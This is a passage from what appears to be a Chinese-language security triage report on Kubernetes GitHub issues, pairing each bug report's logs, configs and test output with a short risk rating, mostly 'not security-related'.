I1001 17:22:45.724468       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.752257       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.820108       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.846131       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:48.640513       1 node_lifecycle_controller.go:884] "Missing timestamp for Node. Assuming now as a timestamp" logger="node-lifecycle-controller" node="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:02.216555       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:02.273556       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:16.215529       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:21.763576       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:46.683733       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:25:05.756696       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:25:05.786234       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
```

The interesting lines are:

```
I1001 16:54:23.001587       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
...
I1001 17:22:45.647668       1 range_allocator.go:422] "Set node PodCIDR" logger="node-ipam-controller" node="ip-172-31-15-241.eu-central-1.compute.internal" podCIDRs=["10.2.4.0/24"]
```

At `16:54` the original node is `Successfully synced` by the `node-ipam-controller` and at `17:22`, much later, does the new node get the same podCIDR allocated as what is already allocated to the original node.

We can also see this from the flannel logs on the new node:

```
 time="2024-10-01T17:22:58Z" level=info msg="Added new node ip-172-31-14-210.eu-central-1.compute.internal with PodCIDR 10.2.4.0/24, address 10.2.4.0"
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
AWS running a custom Kubernetes setup on EC2
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools


<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes v1.31版本中，`kube-controller-manager`可能会将已经分配给现有节点的PodCIDR再次分配给新节点，导致网络冲突和中断。这会引起集群内的网络通信问题，影响服务的可用性。

从安全角度来看，如果攻击者能够利用此漏洞，故意触发PodCIDR重复分配，可能导致拒绝服务（DoS）攻击。然而，实施此攻击需要攻击者具有创建或删除节点的权限，这通常是管理员或高级别用户权限。

根据风险判断标准的第4条，对于拒绝服务攻击，如果攻击者需要一定权限（如创建、修改权限）才能实施攻击，则不应判断为高风险。因此，此问题的风险评级为低风险。

---

# ✅ 不涉及安全风险的 Issues (56 个)

## Issue #128479 Pod in terminating state, Kubernetes EndpointSlice shows pod as running: false, but pod still getting traffic after 120 sec.

- Issue 链接：[#128479](https://github.com/kubernetes/kubernetes/issues/128479)

### Issue 内容

#### What happened?

When doing rolling deployment of a spring boot app, with 120sec pre stop. There is another active pod up and running.
EndpointSlice show this terminating pod as running:false and but in EndpointSlice ips we still see this terminating pod. But it has been removed from service endpoint immediately. Why is the pod in terminating state getting traffic when there is another active pod to receive traffic?

We have an alb ingress controller with instance type and Kubernetes service with node-port type.
We are continuously simulating traffic from a postman client during rolling deployment. And we are getting few 502 errors as the pod in terminating state getting traffic all the while when it is running pre-stop and after that as well.
here is snippet from deployment yaml
```
          lifecycle:
            preStop:
              exec:
                command:
                  - /bin/sh
                  - -c
                  - sleep 120
          livenessProbe:
            httpGet:
              path: /actuator/health/liveness
              port: 8080
            initialDelaySeconds: 60
            periodSeconds: 30
          readinessProbe:
            httpGet:
              path: /actuator/health/readiness
              port: 8080
            initialDelaySeconds: 60
            periodSeconds: 30
   terminationGracePeriodSeconds: 150
```

Below are details from kubectl
```
Endpoints:
  - Addresses:  10.0.153.241
    Conditions:
      Ready:    true
    Hostname:   <unset>
    TargetRef:  Pod/demo-5ccf6cd66c-jpcxh
    NodeName:   ip-10-0-147-87.ec2.internal
    Zone:       us-east-1a
  - Addresses:  10.0.216.8
    Conditions:
      Ready:    true
    Hostname:   <unset>
    TargetRef:  Pod/demo-5ccf6cd66c-tvk46
    NodeName:   ip-10-0-204-238.ec2.internal
    Zone:       us-east-1b
  - Addresses:  10.0.247.50
    Conditions:
      Ready:    false
    Hostname:   <unset>
    TargetRef:  Pod/demo-7c8d47c64f-n7vvp
    NodeName:   ip-10-0-219-33.ec2.internal
    Zone:       us-east-1b
Events:         <none>
```

```
% kubectl get endpointslice -n demo-jj         
NAME                ADDRESSTYPE   PORTS   ENDPOINTS                             AGE
demo-jj  IPv4          8080    10.0.153.241,10.0.216.8,10.0.247.50   220d
```

#### What did you expect to happen?

Terminating pod should be removed from EndpointSlice when it is running pre-stop.

#### How can we reproduce it (as minimally and precisely as possible)?

A spring boot app with above deployment yaml and alb ingress controller should reproduce this while rolling deployment. And simulate traffic through postman performance testing.

#### Anything else we need to know?

_No response_

#### Kubernetes version


<details>v1.29.8-eks-a737599</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes的滚动部署过程中，一个处于终止状态的Pod在运行pre-stop期间仍然接收流量，尽管EndpointSlice中已将该Pod的Ready条件置为false，但其IP仍然存在于EndpointSlice中。这导致在向该正在终止的Pod发送流量时出现502错误。

从安全角度来看，这个问题主要涉及服务的可用性和稳定性，可能引起短暂的服务中断或错误响应。然而，该问题并不涉及攻击者可以利用的安全漏洞，不会导致权限提升、命令执行、数据泄露等高风险安全问题。

根据风险判断标准，该Issue不涉及安全风险。

---

## Issue #128460 fix changelog 1.31 documentation: kubeamd to kubeadm

- Issue 链接：[#128460](https://github.com/kubernetes/kubernetes/issues/128460)

### Issue 内容

#### What happened?

Going through the release notes - I noticed a veryminor code documentation error "kubeamd join"
Some context - Very nice work here.  I have been using Kubernetes since 1.7 in 2018

https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.31.md#bug-or-regression


#### What did you expect to happen?

https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.31.md#bug-or-regression
-Kubeadm: when adding new control plane nodes with "kubeamd join", ensure that the etcd member addition is performed only if a given member URL does not already exist in the list of members
+Kubead,: when adding new control plane nodes with "kubeadm join", ensure that the etcd member addition is performed only if a given member URL does not already exist in the list of members

#### How can we reproduce it (as minimally and precisely as possible)?

Yes, a one line docs change - not code changes

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
michaelobrien@mbp7 modules % kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4-eks-a737599
```

</details>


#### Cloud provider

<details>
agnostic - but I am running EKS and K8S in Docker Desktop
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
@mbp7 modules % uname -a
Darwin mbp7.ht.home 24.0.0 Darwin Kernel Version 24.0.0: Tue Sep 24 23:39:07 PDT 2024; root:xnu-11215.1.12~1/RELEASE_ARM64_T6000 arm64

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue是关于修复文档中的一个小拼写错误，将'kubeamd'更正为'kubeadm'。这是文档中的文字修改，没有涉及代码更改、配置修改或任何功能性的变化。

根据风险判断标准，此Issue不涉及任何安全风险：

1. **该风险能被攻击者利用**：此更改仅影响文档，对系统运行无影响，攻击者无法利用。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此情况不适用。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：因此，此Issue风险评级为“不涉及”。

---

## Issue #128459 Allocating PersistentVolume in-order for StatefulSet pods

- Issue 链接：[#128459](https://github.com/kubernetes/kubernetes/issues/128459)

### Issue 内容

#### What happened?

StatefulSets are the right abstraction when deploying stateful clusters like etcd, kafka, zookeeper, yugabyte, etc.
On initial deployment, everything is great. PVs are allocated and the cluster works.
But in a recovery/recreation scenario, it is impossible to match the PVs with each numbered pod.
This means that pod0 will be started with a random PV, for example that which previously belonged to pod2.

#### What did you expect to happen?

StatefulSet volumeClaimTemplate should be configurable such that it will use persistent volumes with incrementing names.
In the same way that pods are named pod0,pod1, ..., they should not use labels for creating a PVC, but rather volume names with a similar index postfix, e.g. volumename0,volumename1, etc.

The lack of this functionality makes running stateful workloads a pain.

#### How can we reproduce it (as minimally and precisely as possible)?

.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中使用StatefulSet部署有状态应用时，在恢复或重新创建场景下，无法将持久卷（PersistentVolume，PV）与每个编号的Pod匹配的问题。这可能导致`pod0`启动时使用了之前属于`pod2`的PV。这个问题给运维和恢复过程带来了挑战，但并未涉及安全风险。

根据风险判断标准：

- **第6条**：如果Issue不涉及安全问题，则风险评级判断为不涉及。

该问题主要是关于功能和配置的改进需求，没有提及可能被攻击者利用，或导致数据泄露、权限提升等安全漏洞。因此，风险评级判断为**不涉及**。

---

## Issue #128413 response_sizes metrics for verb=WATCH is only present for built in resources.

- Issue 链接：[#128413](https://github.com/kubernetes/kubernetes/issues/128413)

### Issue 内容

#### What happened?

The `apiserver_response_sizes` correctly report `GET` and `LIST` metrics for all resources. However, for `WATCH`, its only present for built in resources. This means resources defined in CustomResourceDefinitions are not present.

Its not 100% clear to me what the expected behavior was when it was introduced (https://github.com/kubernetes/kubernetes/pull/49117), and if the plan was to not have `watch` metrics here - but we have seen it useful in practice. The verb definition here has changed a bit as well, and https://github.com/kubernetes/kubernetes/pull/93523 + https://github.com/kubernetes/kubernetes/pull/81660 split the definition of `verb` and `reportedVerb`. And given this metric is treated as STABLE now, it feels wrong to me to remove the existing `WATCH` metrics here.

Here is an example of how it works today;

```bash
$ kubectl get --raw /metrics | egrep 'apiserver_response_sizes_sum\{component="apiserver",group="(cilium.io)?",resource="(pods|ciliumnetworkpolicies)",scope="cluster"'
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="LIST",version="v1"} 1.00624648e+08
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="WATCH",version="v1"} 2.6141637319e+10
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="LIST",version="v2"} 1.723691e+06
```

As seen both resources have `LIST` metrics, but only the built in resource `pods` has `WATCH`.

#### What did you expect to happen?

I would expect the above request to also contain WATCH for the custom type as well;
```bash
$ kubectl get --raw /metrics | egrep 'apiserver_response_sizes_sum\{component="apiserver",group="(cilium.io)?",resource="(pods|ciliumnetworkpolicies)",scope="cluster"'
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="LIST",version="v1"} 1.00624648e+08
apiserver_response_sizes_sum{component="apiserver",group="",resource="pods",scope="cluster",subresource="",verb="WATCH",version="v1"} 2.6141637319e+10
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="LIST",version="v2"} 1.723691e+06
apiserver_response_sizes_sum{component="apiserver",group="cilium.io",resource="ciliumnetworkpolicies",scope="cluster",subresource="",verb="WATCH",version="v2"} 1.090217513e+09
```

#### How can we reproduce it (as minimally and precisely as possible)?

Install a CRD, have at least one watcher on it, and use `kubectl get --raw /metrics | grep 'apiserver_response_sizes_sum'` and look for the `WATCH` metric of that resource.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0
```

Seems to be reproduceable across all recent versions.

</details>


#### Cloud provider

<details>
n/a - can reproduce in kind.
</details>


#### OS version

<details>

n/a.

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue涉及到Kubernetes在监控指标`apiserver_response_sizes`中，对于自定义资源（CustomResourceDefinition）的`WATCH`操作缺少相应的指标数据。这个问题属于功能性缺陷或监控指标不完整的问题，不涉及潜在的安全风险。根据给定的风险判断标准，Issue不涉及安全问题。

---

## Issue #128397 k8s cgroup cpuset disappear causing container restart

- Issue 链接：[#128397](https://github.com/kubernetes/kubernetes/issues/128397)

### Issue 内容

#### What happened?



```

[root@n1 kubepods-besteffort.slice]# cat /sys/fs/cgroup/kubepods.slice/kubepods-besteffort.slice/*/cgroup.controllers
cpu io memory hugetlb pids rdma misc
cpu io memory hugetlb pids rdma misc

# wait 
[root@n1 kubepods-besteffort.slice]# cat /sys/fs/cgroup/kubepods.slice/kubepods-besteffort.slice/*/cgroup.controllers
cpuset cpu io memory hugetlb pids rdma misc
cpuset cpu io memory hugetlb pids rdma misc
```

the disappearance of cpuset causes container restart


How should I handle it

#### What did you expect to happen?

。

#### How can we reproduce it (as minimally and precisely as possible)?

Just install it

#### Anything else we need to know?

_No response_

#### Kubernetes version


- kubernetes-cni-1.2.0-150500.2.1.x86_64
- kubectl-1.28.15-150500.1.1.x86_64
- kubelet-1.28.15-150500.1.1.x86_64
- kubeadm-1.28.15-150500.1.1.x86_64
- containerd.io-1.7.22-3.1.el9.x86_64

<details>
```console
$ kubectl version
Client Version: v1.28.15
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.2 (Turquoise Kodkod)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.2"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.2 (Turquoise Kodkod)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.2"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.2"

$ uname -a
Linux bx-10-182-20-103 5.14.0-284.25.1.el9_2.sinarelease.6.x86_64 #1 SMP PREEMPT_DYNAMIC Mon Oct 30 03:56:46 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes环境中，cgroup的cpuset控制器会暂时消失，然后又重新出现，导致容器重启的问题。这似乎是由于系统本身或Kubernetes调度导致的cgroup控制器状态变化，引起了容器的不稳定运行。根据提供的信息，这更像是一个性能或稳定性问题，而不是安全问题。

按照风险判断标准：

1. **该风险能被攻击者利用**：没有证据表明攻击者可以利用该问题。
2. **该风险有可能成为一个漏洞，并被分配CVE编号**：此问题未涉及任何已知的漏洞或可被利用的安全缺陷。
3. **Issue提交者的问题**：问题描述的是系统行为，没有提及任何不当操作或配置。
4. **拒绝服务（DoS）攻击**：虽然容器重启可能导致服务中断，但没有迹象表明这是由攻击者触发，且未说明攻击者可以利用此行为实施DoS攻击。

综上所述，该Issue不涉及安全风险。

---

## Issue #128381 During the offline upgrade process from Kubernetes 1.22.16 to 1.25.1, the upgrade to version 1.24 proceeded normally, but when upgrading from 1.24 to 1.25, the connection to the API server was refused. Could this be due to significant differences between versions 1.24 and 1.25?

- Issue 链接：[#128381](https://github.com/kubernetes/kubernetes/issues/128381)

### Issue 内容

#### What happened?

[root@master 1.25]#  kubeadm upgrade apply v1.25.1
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'
[preflight] Running pre-flight checks.
[upgrade] Running cluster health checks
[upgrade/version] You have chosen to change the cluster version to "v1.25.1"
[upgrade/versions] Cluster version: v1.24.1
[upgrade/versions] kubeadm version: v1.25.1
[upgrade] Are you sure you want to proceed? [y/N]: y
[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster
[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection
[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'
[upgrade/apply] Upgrading your Static Pod-hosted control plane to version "v1.25.1" (timeout: 5m0s)...
[upgrade/etcd] Upgrading to TLS for etcd
[upgrade/staticpods] Preparing for "etcd" upgrade
[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade
[upgrade/etcd] Waiting for etcd to become available
[upgrade/staticpods] Writing new Static Pod manifests to "/etc/kubernetes/tmp/kubeadm-upgraded-manifests2899699821"
[upgrade/staticpods] Preparing for "kube-apiserver" upgrade
[upgrade/staticpods] Renewing apiserver certificate
[upgrade/staticpods] Renewing apiserver-kubelet-client certificate
[upgrade/staticpods] Renewing front-proxy-client certificate
[upgrade/staticpods] Renewing apiserver-etcd-client certificate
[upgrade/staticpods] Moved new manifest to "/etc/kubernetes/manifests/kube-apiserver.yaml" and backed up old manifest to "/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-10-28-04-13-27/kube-apiserver.yaml"
[upgrade/staticpods] Waiting for the kubelet to restart the component
[upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s)
[upgrade/apply] FATAL: couldn't upgrade control plane. kubeadm has tried to recover everything into the earlier state. Errors faced: failed to obtain static Pod hash for component kube-apiserver on Node 192.168.40.130: Get "https://apiserver.cluster.local:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-192.168.40.130?timeout=10s": dial tcp 192.168.40.130:6443: connect: connection refused
To see the stack trace of this error execute with --v=5 or higher
[root@master 1.25]#  kubeadm upgrade apply v1.25.1
[upgrade/config] Making sure the configuration is correct:
[upgrade/config] Reading configuration from the cluster...
[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'
[upgrade/config] FATAL: failed to get config map: Get "https://apiserver.cluster.local:6443/api/v1/namespaces/kube-system/configmaps/kubeadm-config?timeout=10s": dial tcp 192.168.40.130:6443: connect: connection refused


#### What did you expect to happen?

Normal upgrade

#### How can we reproduce it (as minimally and precisely as possible)?

Upgrading using an offline method

#### Anything else we need to know?

Upgrading from version 1.22.16 deployed using Sealer to version 1.25 in an offline environment.

#### Kubernetes version

1.24.1

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用离线方式将Kubernetes从1.24升级到1.25.1时，遇到了连接到API服务器被拒绝的问题，导致升级失败。从错误信息来看，这是由于kube-apiserver无法正常连接所致，可能是升级过程中配置或兼容性的问题。该问题属于升级过程中的操作故障，并不涉及潜在的安全风险。没有涉及攻击者可以利用的漏洞，也没有敏感信息泄露。

---

## Issue #128378 The deployment method for cadvisor isn't effective

- Issue 链接：[#128378](https://github.com/kubernetes/kubernetes/issues/128378)

### Issue 内容

#### What happened?

I deploy cadvisor following "https://github.com/google/cadvisor/tree/master/deploy/kubernetes". After "kustomize build "https://github.com/google/cadvisor/deploy/kubernetes/base?ref=${VERSION}" | kubectl apply -f -", there is no pod for cadvisor.

#### What did you expect to happen?

There is pod for cadvisor

#### How can we reproduce it (as minimally and precisely as possible)?

Follow "https://github.com/google/cadvisor/tree/master/deploy/kubernetes"

#### Anything else we need to know?

The output is 
```console
Warning: 'commonLabels' is deprecated. Please use 'labels' instead. Run 'kustomize edit fix' to update your Kustomization automatically.
namespace/cadvisor created
serviceaccount/cadvisor created
daemonset.apps/cadvisor created
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.28.14
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.15
```

</details>


#### Cloud provider

<details>
No
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在按照cadvisor的Kubernetes部署方法进行部署后，没有看到预期的cadvisor pod。这是一个与部署过程和配置相关的功能性问题，没有提及任何可能被攻击者利用的安全风险。

根据风险判断标准：

- **第6条**：如果Issue不涉及安全问题，则风险评级判断为不涉及。

因此，该Issue不涉及安全风险。

---

## Issue #128375 [FG:InPlacePodVerticalScaling] failed to verify pod status checkpoint checksum because of different behaviors of func Quantity.Marshal and Quantity.Unmarshal

- Issue 链接：[#128375](https://github.com/kubernetes/kubernetes/issues/128375)

### Issue 内容

#### What happened?

One line bug description: the content func [stateCheckpoint.storeState](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/state_checkpoint.go#L80) writes into the file /var/lib/kubelet/pod_status_manager_state is different from it func [stateCheckpoint.restoreState](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/state_checkpoint.go#L59) reads from the same file, which causes function [VerifyChecksum](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/checkpoint.go#L59) always fails for some format of Quantity value.


#### What did you expect to happen?

Kubelet doesn't crash and can start normally

#### How can we reproduce it (as minimally and precisely as possible)?

1. prepare a pod spec with content below
```yaml
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "nginx2"
  },
  "spec": {
    "containers": [
      {
        "name": "nginx",
        "image": "nginx:1.14.2",
        "ports": [
          {
            "containerPort": 80
          }
        ],
        "resources": {
          "requests": {
            "cpu": "0.4",
            "memory": "1Gi"
          },
          "limits": {
            "cpu": "1.5",
            "memory": "1Gi"
          }
        }
      }
    ]
  }
}
```
2. copy the pod spec into dir /etc/kubernetes/manifest/ in master node
3. restart the kubelet systemctl restart kubelet
4. the kubelet will crash all the time until the file /var/lib/kubelet/pod_status_manager_state is deleted
5. error message would be like below
```text
Aug 10 04:39:38 minikube systemd[1]: kubelet.service: Failed with result 'exit-code'.
Aug 10 04:39:38 minikube systemd[1]: kubelet.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/cmd/kubelet/app/server.go:1239 +0x90
Aug 10 04:39:38 minikube kubelet[1190750]: created by k8s.io/kubernetes/cmd/kubelet/app.startKubelet in goroutine 1
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/pkg/kubelet/kubelet.go:1628 +0x658
Aug 10 04:39:38 minikube kubelet[1190750]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).Run(0x4000ccac08, 0x4000ca1140)
Aug 10 04:39:38 minikube kubelet[1190750]:         k8s.io/kubernetes/pkg/kubelet/status/status_manager.go:204 +0x28c
Aug 10 04:39:38 minikube kubelet[1190750]: k8s.io/kubernetes/pkg/kubelet/status.(*manager).Start(0x40007a3a70)
Aug 10 04:39:38 minikube kubelet[1190750]: goroutine 239 [running]:
Aug 10 04:39:38 minikube kubelet[1190750]: panic: could not restore state from checkpoint: checkpoint is corrupted, please drain this node and delete pod allocation checkpoint file "/var/lib/kubelet/pod_status_manager_state" before restarting Kubelet
Aug 10 04:39:38 minikube kubelet[1190750]: E0810 04:39:38.722303 1190750 status_manager.go:203] "Could not initialize pod allocation checkpoint manager, please drain node and remove policy state file" err="could not restore state from checkpoint: checkpoint is corrupted, please drain this node and delete pod allocation checkpoint file \"/var/lib/kubelet/pod_status_manager_state\" before restarting Kubelet"
```


#### Anything else we need to know?

## Root cause
The json marshal function of Quantity type will convert itself to CanonicalBytes
https://github.com/kubernetes/apimachinery/blob/95b78024e3feada7739b40426690b4f287933fd8/pkg/api/resource/quantity.go#L452C25-L452C41
But the json unmarshal function of Quantity type won't do that.
https://github.com/kubernetes/apimachinery/blob/95b78024e3feada7739b40426690b4f287933fd8/pkg/api/resource/quantity.go#L701
For some formats for Quantity value, the Quantity contents, wrote to and read from the same file, might be different.
For example, if the pod cpu request is defined as cpu: "0.4", the Quantity content is cpu:{{4 -1} {<nil>}  DecimalSI before writing it into the file, but the content is cpu:{{400 -3} {<nil>} 400m DecimalSI after reading from the same file.

According to the reason above, the function [VerifyChecksum](https://github.com/kubernetes/kubernetes/blob/60c4c2b2521fb454ce69dee737e3eb91a25e0535/pkg/kubelet/status/state/checkpoint.go#L59) might fail.

## Detailed test case
<details>

```go
=== RUN   Test_stateCheckpoint_storeState
=== RUN   Test_stateCheckpoint_storeState/format_0_-_cpu_1Ki
=== RUN   Test_stateCheckpoint_storeState/format_1_-_cpu_1Mi
=== RUN   Test_stateCheckpoint_storeState/format_2_-_cpu_1Gi
=== RUN   Test_stateCheckpoint_storeState/format_3_-_cpu_1Ti
=== RUN   Test_stateCheckpoint_storeState/format_4_-_cpu_1Pi
=== RUN   Test_stateCheckpoint_storeState/format_5_-_cpu_1Ei
=== RUN   Test_stateCheckpoint_storeState/format_6_-_cpu_1n
=== RUN   Test_stateCheckpoint_storeState/format_7_-_cpu_1u
=== RUN   Test_stateCheckpoint_storeState/format_8_-_cpu_1m
=== RUN   Test_stateCheckpoint_storeState/format_9_-_cpu_1k
=== RUN   Test_stateCheckpoint_storeState/format_10_-_cpu_1M
=== RUN   Test_stateCheckpoint_storeState/format_11_-_cpu_1G
=== RUN   Test_stateCheckpoint_storeState/format_12_-_cpu_1T
=== RUN   Test_stateCheckpoint_storeState/format_13_-_cpu_1P
=== RUN   Test_stateCheckpoint_storeState/format_14_-_cpu_1E
=== RUN   Test_stateCheckpoint_storeState/format_15_-_cpu_1
=== RUN   Test_stateCheckpoint_storeState/format_16_-_cpu_0.1Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_17_-_cpu_0.1Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_18_-_cpu_0.1Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_19_-_cpu_0.1Ti
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_20_-_cpu_0.1Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_21_-_cpu_0.1Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
